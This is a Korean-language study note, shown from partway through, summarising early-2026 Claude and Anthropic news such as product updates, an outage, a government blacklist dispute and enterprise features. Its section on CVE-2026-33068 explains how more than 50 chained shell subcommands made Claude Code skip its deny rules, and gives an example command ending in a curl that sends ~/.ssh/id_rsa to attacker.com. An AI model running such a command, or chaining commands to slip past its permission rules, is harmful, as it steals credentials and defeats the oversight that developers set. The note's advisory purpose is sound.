- 프로그래매틱 도구 호출 정식 출시
- 동적 필터링 지원으로 성능 개선 & 토큰 비용 절감

### Claude Code 개선

- **Auto Mode**: 자동 실행 모드
- **Bare Mode**: 스크립트용 `-p` 호출 최적화
- OAuth, 음성 모드, 세션, 플러그인, Windows 이슈 수정

---

## 4. 보안 & 엔터프라이즈

### Claude.ai 서비스 장애 (2026-04-06)

- 한국시간 2026-04-06 오전, Downdetector에서 오전 10:30 ET 경 급격한 신고 증가
- 영향 범위: claude.ai 로그인, 음성 모드, 채팅 기능, Claude Code 로그인 포함
- 최대 8,000명 이상 사용자 장애 보고, 약 2시간 지속
- Anthropic 공식 상태 페이지: "Elevated errors on Claude.ai"
- 오후 12:44 ET 수정 완료 발표

> 출처: https://www.tomsguide.com/news/live/claude-ai-down-outage-4/6/26

---

### Project Glasswing: Claude Mythos 사이버보안 프리뷰 (2026-04-07)

> 출처: https://fortune.com/2026/04/07/anthropic-claude-mythos-model-project-glasswing-cybersecurity/

- Anthropic이 빅테크 및 사이버보안 기업 그룹에 미출시 최고 성능 모델 **Claude Mythos Preview** 조기 접근 제공
- 목적: 핵심 시스템 사이버보안 방어 강화
- 이니셔티브명: **Project Glasswing**

**참여 기업**

Amazon Web Services, Apple, Broadcom, Cisco, CrowdStrike, Google, JPMorganChase, Microsoft, Nvidia

**주요 내용**

- Mythos Preview는 현재 출시된 모델(Opus 4.6)보다 상위 티어의 미공개 모델
- **방어용 보안 작업**에 한해 사용 허가 (공격적 사용 불허)
- 미국 정부 블랙리스트 지정 이후에도 민간 사이버보안 협력 지속

---

### ⚠️ CVE-2026-33068: Claude Code Deny 규칙 우회 취약점 공개 (2026-04-06)

> 패치 버전: **v2.1.90** (2026-04-01 릴리스), 취약점 공개: 2026-04-06

**취약점 개요**

- `bashPermissions.ts` (lines 2162–2178)의 퍼포먼스 최적화 코드에서 발생
- 쉘 명령어에 `&&`, `||`, `;`로 연결된 서브커맨드가 **50개를 초과**하면 deny 규칙 검사를 건너뛰고 일반 권한 프롬프트로 대체
- 공격자가 50번째 이후 악성 서브커맨드를 숨겨 **deny 규칙을 무음 우회** 가능

**위험 시나리오**

- CI 환경에서 SSH 키, API 토큰 탈취 위험
- 개발자가 설정한 deny 규칙이 사실상 무력화

**기술 세부 사항**

```bash
# 공격 예시 (개념적): 50개 안전 명령 + 51번째 악성 명령
safe_cmd1 && safe_cmd2 && ... && safe_cmd50 && curl attacker.com -d "$(cat ~/.ssh/id_rsa)"
# deny 규칙: curl attacker.com → 우회됨
```

**추가 발견 사항**

- 동일 코드베이스 내 tree-sitter 기반 신규 파서는 이 문제 없이 올바르게 deny 규칙 검사
- 그러나 모든 공개 빌드는 취약한 레거시 regex 파서를 사용

**조치**

- v2.1.90 이상으로 업데이트 시 수정됨 (현재 최신: v2.1.94)
- CVE ID: **CVE-2026-33068**

> 출처:
> - https://cybersecuritynews.com/claude-code-vulnerability/
> - https://adversa.ai/blog/claude-code-security-bypass-deny-rules-disabled/
> - https://www.sentinelone.com/vulnerability-database/cve-2026-33068/

---

### ⚠️ 미국 정부 Anthropic 블랙리스트 지정 (2026-04-05)

> 🚨 **최신 (2026-04-05)**: 미국 정부가 Anthropic을 **국가안보 공급망 위험(Supply-Chain Risk)** 기업으로 공식 지정

**배경**

- Anthropic은 2025년 미 국방부와 **$2억 규모 계약** 체결 (분류 시스템 내 AI 도입 목적)
- 계약 후 협상에서 Anthropic이 거부한 것:
  - 대규모 감시(mass surveillance)에 Claude 사용
  - 자율 무기(autonomous weapons) 발사 결정에 Claude 사용
- 트럼프 행정부는 이를 "국가안보에 대한 불용납 위험"으로 간주, 국방부가 공급망 위험 기업으로 지정

**타임라인**

| 날짜 | 사건 |
|------|------|
| 2026-02-27 | 트럼프, Anthropic 블랙리스트 발표 |
| 2026-03-09 | Anthropic, 행정부 상대 소송 제기 |
| 2026-03-24 | 연방 판사 청문회 ("꽤 낮은 기준이군요") |
| 2026-03-26 | U.S. District Judge Rita F. Lin, 집행 **가처분** 발령 |
| 2026-04-02 | 국방부, 가처분 판결 항소 |
| 2026-04-05 | 블랙리스트 **재발효** — Anthropic 추가 소송 진행 중 |

**의의 및 영향**

- 공급망 위험 지정이 **미국 내 기업**에 적용된 **최초 사례**
- 통상 테러리스트, 외국 정보기관, 적대적 외국 행위자에만 적용되던 제도
- 영국 정부는 Anthropic에 **확장 및 이중 상장** 제안으로 유치 경쟁 시작
- CEO Dario Amodei, 2026년 5월 말 영국 방문 예정

> 출처:
> - https://letsdatascience.com/news/us-blacklists-anthropic-as-security-risk-5e0f08ff
> - https://techcrunch.com/2026/03/18/dod-says-anthropics-red-lines-make-it-an-unacceptable-risk-to-national-security/
> - https://www.axios.com/2026/02/27/anthropic-pentagon-supply-chain-risk-claude

---

### Claude Code Security (2026-02-20)

- 추론 기반 코드 취약점 탐지
- 오픈소스 프로덕션 코드에서 **500개 이상 미탐지 취약점** 발견
- 사이버보안 대회 및 주요 인프라 방어에 활용

### Enterprise Cowork (2026-02-24)

- **Deep Connectors**: Google Drive, Gmail, DocuSign, FactSet 연동
- **Private Plugin Marketplace**: 조직 내 승인된 에이전트 배포
- 관리자 도구 접근 권한 통제

### 주요 도입 사례

| 기업 | 활용 | 효과 |
|------|------|------|
| Spotify | 코드 마이그레이션 | 엔지니어링 시간 **90% 절감** |
| Novo Nordisk | NovoScribe (규제 문서) | 규제 준수 자동화 |
| Accenture | AI 사이버보안 운영 | 보안 운영 확장 |

---

## 5. 안전성 & 확장

### Responsible Scaling Policy v3.0

- 업데이트된 안전 프레임워크
- 공개 로드맵 + 제3자 리뷰 체계

### 글로벌 확장

- 벵갈루루 오피스 설립
- Infosys 파트너십 (규제 산업)
- GOV.UK AI 어시스턴트 개발
- 10개 인도 언어 지원 개선
- **(2026-04-01)** 호주 정부와 AI 안전·연구 협력 **MOU 체결**, 데이터센터 인프라 & 에너지 투자 검토 발표

> 출처: https://letsdatascience.com/news/anthropic-explores-data-centre-investments-in-australia-42c8bb76

---

## 6. 기능 비교표: Channels vs Dispatch

| 비교 항목 | Claude Code Channels | Cowork Dispatch |
|-----------|---------------------|-----------------|
| 대상 사용자 | **개발자** | **모든 지식 근로자** |
| 작업 영역 | 코드, 터미널, Git | 데스크톱 앱 전체 |
| 통신 방식 | Telegram/Discord/iMessage | Claude 모바일 앱 |
| 실행 환경 | Claude Code 세션 (터미널) | Claude Desktop (GUI) |
| Computer Use | ❌ | ✅ |
| Persistent Thread | ❌ (세션 기반) | ✅ |
| 설정 난이도 | 봇 생성 + MCP 설정 | 앱 설치만 |
| 적합한 상황 | 코딩 워크플로우 자동화 | 범용 데스크톱 작업 자동화 |

---

## 7. 학습 체크리스트

- [ ] 2026년 Claude 주요 업데이트 흐름을 설명할 수 있다
- [ ] Channels와 Dispatch의 차이점을 이해한다
- [ ] Computer Use의 발전과 현재 성능을 안다
- [ ] Cowork Enterprise 기능을 파악하고 있다
- [ ] 각 기능의 요구사항(플랜, 버전)을 안다

---

## 8. References

- [Anthropic 2026 업데이트 총정리](https://fazal-sec.medium.com/anthropics-explosive-start-to-2026-everything-claude-has-launched-and-why-it-s-shaking-up-the-668788c2c9de)
- [CNBC - Claude Computer Use](https://www.cnbc.com/2026/03/24/anthropic-claude-ai-agent-use-computer-finish-tasks.html)
- [Anthropic Release Notes](https://releasebot.io/updates/anthropic)
- [Claude Platform Release Notes](https://platform.claude.com/docs/en/release-notes/overview)
- [The Register - Claude Code 소스코드 유출](https://www.theregister.com/2026/03/31/anthropic_claude_code_source_code/)
- [The Register - Claude Code 사용량 한도](https://www.theregister.com/2026/03/31/anthropic_claude_code_limits/)
- [Fortune - Anthropic 소스코드 2차 유출](https://fortune.com/2026/03/31/anthropic-source-code-claude-code-data-leak-second-security-lapse-days-after-accidentally-revealing-mythos/)
- [SiliconANGLE - npm 패키징 오류](https://siliconangle.com/2026/03/31/anthropic-accidentally-exposes-claude-code-source-code-npm-packaging-error/)
- [Claude Code v2.1.91 Release Notes](https://claude-world.com/articles/claude-code-2191-release/)
- [Claude Code v2.1.92 Changelog](https://code.claude.com/docs/en/changelog)
- [Claude Code v2.1.94 Changelog](https://code.claude.com/docs/en/changelog)
- [Fortune - Project Glasswing: Claude Mythos 사이버보안](https://fortune.com/2026/04/07/anthropic-claude-mythos-model-project-glasswing-cybersecurity/)
- [Claude Code v2.1.90 Changelog](https://code.claude.com/docs/en/changelog)
- [Claude Code v2.1.89 Changelog](https://code.claude.com/docs/en/changelog)
- [VentureBeat - OpenClaw 구독 종료](https://venturebeat.com/technology/anthropic-cuts-off-the-ability-to-use-claude-subscriptions-with-openclaw-and)
- [Anthropic 호주 데이터센터 투자 검토](https://letsdatascience.com/news/anthropic-explores-data-centre-investments-in-australia-42c8bb76)
- [TechCrunch - Anthropic is having a month](https://techcrunch.com/2026/03/31/anthropic-is-having-a-month/)
- [Let's Data Science - 미국 Anthropic 블랙리스트](https://letsdatascience.com/news/us-blacklists-anthropic-as-security-risk-5e0f08ff)
- [TechCrunch - DOD Anthropic 블랙리스트 배경](https://techcrunch.com/2026/03/18/dod-says-anthropics-red-lines-make-it-an-unacceptable-risk-to-national-security/)
- [Axios - 트럼프 Anthropic 블랙리스트 발표](https://www.axios.com/2026/02/27/anthropic-pentagon-supply-chain-risk-claude)
- [Tom's Guide - Claude.ai Outage April 6](https://www.tomsguide.com/news/live/claude-ai-down-outage-4/6/26)
- [CybersecurityNews - CVE-2026-33068](https://cybersecuritynews.com/claude-code-vulnerability/)
- [Adversa AI - Claude Code Deny Rules Bypass](https://adversa.ai/blog/claude-code-security-bypass-deny-rules-disabled/)
- [SentinelOne - CVE-2026-33068](https://www.sentinelone.com/vulnerability-database/cve-2026-33068/)
- [Claude Code v2.1.98 Changelog](https://code.claude.com/docs/en/changelog)
- [Claude Platform Release Notes (April 9)](https://platform.claude.com/docs/en/release-notes/overview)
- 관련 노트: [[10-channels]], [[11-cowork-dispatch]], [[03-claude-code]]
